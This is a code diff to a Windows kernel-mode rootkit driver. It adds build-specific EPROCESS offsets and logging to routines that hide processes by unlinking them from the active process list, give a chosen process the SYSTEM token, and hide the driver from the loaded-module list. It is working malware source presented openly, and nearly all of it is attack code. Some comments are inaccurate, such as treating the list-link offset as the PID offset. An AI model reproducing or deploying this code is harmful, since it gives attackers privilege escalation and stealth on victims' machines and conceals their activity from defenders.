@@ -2,23 +2,57 @@
 #pragma warning(push)
 #pragma warning(disable: 4100)  // Unreferenced formal parameter
 #pragma warning(disable : 4099)
-#define TOKEN_OFFSET 0x4b8
-#define ACTIVE_PROCESS_LINKS_OFFSET 0x448
-
+// debug printing
 void debug_print(PCSTR text) {
     KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, text));
 }
-
 /*
-Functions
+Functions 
 */
+
+ULONG TOKEN_OFFSET = 0;
+ULONG ACTIVE_PROCESS_LINKS_OFFSET = 0;
+ULONG IMAGE_FILE_NAME_OFFSET = 0;
+
+ULONG GetImageFileNameOffset() {
+    RTL_OSVERSIONINFOW osVersion = { 0 };
+    osVersion.dwOSVersionInfoSize = sizeof(osVersion);
+
+    // Query the OS version
+    if (NT_SUCCESS(RtlGetVersion(&osVersion))) {
+        // Switch based on the build number and set the offsets accordingly
+        switch (osVersion.dwBuildNumber) {
+        case 26100: // Windows 11 24H2 
+            TOKEN_OFFSET = 0x248;
+            ACTIVE_PROCESS_LINKS_OFFSET = 0x1d8;
+            IMAGE_FILE_NAME_OFFSET = 0x338;
+            break;
+            // Only in windows 11 24H2 the offsets changed, it's because i hate microsoft.
+            // Default case is when we didnt specify a case for the build number that the PC is using, so we just use the traditional ones.
+        case 7601: // Windows 7 latest build
+            TOKEN_OFFSET = 0x208;
+            ACTIVE_PROCESS_LINKS_OFFSET = 0x188;
+            IMAGE_FILE_NAME_OFFSET = 0x2e0;
+            break;
+        default: // Just use them default ones.
+            TOKEN_OFFSET = 0x4b8;
+            ACTIVE_PROCESS_LINKS_OFFSET = 0x448;
+            IMAGE_FILE_NAME_OFFSET = 0x5a8;
+            break;
+        }
+        return osVersion.dwBuildNumber;
+    }
+    else {
+        return 0;
+    }
+}
 
 VOID FlinkBlinkHide(PLIST_ENTRY Current) {
     PLIST_ENTRY Prev, Next;
 
     // Get the previous and next list entries from the current entry
-    Prev = (Current->Blink); // The previous is a backwards link
-    Next = (Current->Flink); // The next one is a forwards link.
+    Prev = (Current->Blink);
+    Next = (Current->Flink);
 
     // Unlink the current entry from the list:
     // 1. Set the previous entry's Flink (forward link) to the point of the next entry
@@ -34,12 +68,20 @@ VOID FlinkBlinkHide(PLIST_ENTRY Current) {
     return;
 }
 
+/*VOID HideProcessByName(UCHAR name[15]) {
+    GetImageFileNameOffset();
+}*/
+
 VOID HideProcess(UINT32 PID) {
+    if (GetImageFileNameOffset() == 0) {
+        debug_print("[!-!] Aborting HideProcess, unknown build.");
+        return;
+    }
+    debug_print("[+] HideProcess function called.\n");
     // Assume ACTIVE_PROCESS_LINKS_OFFSET is the offset to the process ID within the EPROCESS struct.
     // Here, PID_OFFSET is set to that offset.
     ULONG PID_OFFSET = ACTIVE_PROCESS_LINKS_OFFSET;
     ULONG LIST_OFFSET = PID_OFFSET;
-
     // The code uses an INT_PTR variable to adjust LIST_OFFSET
     // Essentially, LIST_OFFSET is advanced by the size of the pointer itself (likely 8 bytes)
     INT_PTR ptr;
@@ -58,6 +100,7 @@ VOID HideProcess(UINT32 PID) {
     if (*(UINT32*)CurrentPID == PID) {
         // If the current process PID is the one we want to hide, the hide it by unlinking it from its list entry.
         FlinkBlinkHide(CurrentList);
+        debug_print("[+] Process is now hidden.\n");
         return;
     }
     // Otherwise, we set a starting point to start looping.
@@ -76,6 +119,7 @@ VOID HideProcess(UINT32 PID) {
     while ((ULONG_PTR)StartProcess != (ULONG_PTR)CurrentEPROCESS) {
         // If the current process PID in the loop matches the one we want to hide, we unlink it from the list.
         if (*(UINT32*)CurrentPID == PID) {
+            debug_print("[+] Process is now hidden.\n");
             FlinkBlinkHide(CurrentList);
             return;
         }
@@ -86,10 +130,16 @@ VOID HideProcess(UINT32 PID) {
         CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);
     }
     // Return the result.
+    debug_print("[*] Returning from function HideProcess.\n");
     return;
 }
 
 NTSTATUS ElevateProcess(UINT32 PID) {
+    if (GetImageFileNameOffset() == 0) {
+        debug_print("[!-!] Aborting ElevateProcess, unknown build.");
+        return STATUS_UNSUCCESSFUL;
+    }
+    GetImageFileNameOffset();
     DbgPrint("[+] Starting to elevate process %u.\n", PID);
     NTSTATUS status = STATUS_SUCCESS;
     PEPROCESS pTargetProcess, pSystemProcess;
@@ -121,9 +171,9 @@ NTSTATUS ElevateProcess(UINT32 PID) {
     // to the target process's EPROCESS structure, using the current latest known offset, which is defined as 0x4b8
     __try {
         *(UINT64*)((UINT64)pTargetProcess + (UINT64)TOKEN_OFFSET) = *(UINT64*)(UINT64(pSystemProcess) + (UINT64)TOKEN_OFFSET); // Now the token pointer for the target pid is now the SYSTEM's one, essentially copying it.
-        debug_print("--------------------------------------------------------");
+        debug_print("--------------------------------------------------------\n");
         debug_print("[+] Successfully elevated process using SYSTEM token.\n");
-        debug_print("--------------------------------------------------------");
+        debug_print("--------------------------------------------------------\n");
         return STATUS_SUCCESS;
     }
     __except (EXCEPTION_EXECUTE_HANDLER) {
@@ -181,6 +231,10 @@ void HideDriverHandler(PDRIVER_OBJECT DriverObject) {
     KeReleaseSpinLock(&g_Lock, oldIrql);
     debug_print("[+] Driver is now hidden.\n");
 }
+
+/*
+End Of Functions.
+*/
 
 namespace Rootkit {
     namespace codes {
